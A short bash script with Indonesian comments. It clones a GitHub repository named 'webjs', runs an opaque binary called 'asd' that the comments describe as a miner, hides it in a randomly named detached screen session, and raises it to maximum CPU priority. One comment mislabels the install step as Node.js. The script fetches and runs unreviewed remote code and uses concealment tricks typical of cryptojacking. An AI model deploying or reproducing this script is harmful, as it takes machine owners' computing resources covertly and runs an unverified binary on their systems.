#!/bin/bash

# Nama proses screen random
RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Instal Node.js (notjs) dan dependensi lain
apt-get update -y
apt-get install -y wget tar screen curl git

# Clone dan jalankan miner
git clone https://github.com/amirul5656/webjs.git
cd webjs
chmod +x asd

# Jalankan miner dalam screen
screen -dmS "$RAND_NAME" ./asd

# Tunggu sebentar agar proses mulai
sleep 2

# Atur prioritas tinggi untuk proses ./asd
for PID in $(pgrep -f "./asd"); do
  renice -20 -p "$PID"
done

echo "🚀 Miner 'asd' sedang berjalan di screen: $RAND_NAME (prioritas tinggi 🔥)"
